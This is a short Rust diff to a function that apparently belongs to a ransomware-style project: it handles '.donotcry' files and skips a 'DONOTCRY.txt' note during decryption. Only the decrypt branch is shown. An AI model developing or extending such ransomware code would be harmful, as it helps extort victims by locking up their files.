@@ -23,13 +23,15 @@ pub fn encrypt_or_decrypt(filename: &str, action: &str) -> bool {
         }
 
         "decrypt" => {
-            let msg = format!("[*] Decrypting {}", filename);
-            println!("{}", msg.green());
+            if !filename.contains("DONOTCRY.txt") {
+                let msg = format!("[*] Decrypting {}", filename);
+                println!("{}", msg.green());
 
-            let decrypted = cipher.cbc_decrypt(iv, &fs::read(filename).unwrap());
-            fs::write(filename, decrypted).unwrap();
-            let new_filename = filename.replace(".donotcry", "");
-            fs::rename(filename, new_filename).unwrap();
+                let decrypted = cipher.cbc_decrypt(iv, &fs::read(filename).unwrap());
+                fs::write(filename, decrypted).unwrap();
+                let new_filename = filename.replace(".donotcry", "");
+                fs::rename(filename, new_filename).unwrap();
+            }
         }
 
         _ => {
